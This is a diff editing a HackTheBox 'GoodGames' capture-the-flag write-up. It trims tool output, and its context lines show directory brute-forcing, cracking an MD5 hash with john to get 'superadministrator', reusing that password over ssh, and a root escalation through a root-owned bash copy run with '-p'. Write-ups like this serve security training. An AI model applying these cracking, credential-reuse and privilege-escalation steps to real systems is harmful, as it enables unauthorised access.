@@ -64,7 +64,6 @@ Lets use `dirb` to check if we missed out anything hidden.
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
 └─# dirb http://10.10.11.130 /usr/share/dirb/wordlists/common.txt   
 ...
-
 ---- Scanning URL: http://10.10.11.130/ ----
 + http://10.10.11.130/blog (CODE:200|SIZE:44212)                                                                     
 + http://10.10.11.130/forgot-password (CODE:200|SIZE:32744)                                                          
@@ -335,13 +334,9 @@ Possible Hashs:
                                              
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/GoodGames]
 └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt -format=Raw-MD5
-Using default input encoding: UTF-8
-Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
-Warning: no OpenMP support for this hash type, consider --fork=4
-Press 'q' or Ctrl-C to abort, almost any other key for status
+...
 superadministrator (?)     
 ...
-Session completed. 
 ```
 
 Yay~ We found the password `superadministrator`.
@@ -567,15 +562,7 @@ Are you sure you want to continue connecting (yes/no)? yes
 yes
 Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
 augustus@172.19.0.1's password: superadministrator
-
-Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
+...
 augustus@GoodGames:~$ sudo -l
 -bash: sudo: command not found
 augustus@GoodGames:~$ ls
@@ -608,6 +595,7 @@ bash  nmap  user.txt
 augustus@GoodGames:~$ exit
 logout
 Connection to 172.19.0.1 closed.
+
 root@3a453ab39d3d:/home/augustus# ls
 bash  nmap  user.txt
 root@3a453ab39d3d:/home/augustus# chown root:root bash
@@ -627,6 +615,7 @@ lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
 -rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
 -rw-r----- 1 root     augustus      33 Aug 15 14:10 user.txt
 augustus@GoodGames:~$ ./bash -p
+
 bash-5.1# whoami
 root
 bash-5.1# cat /home/augustus/user.txt
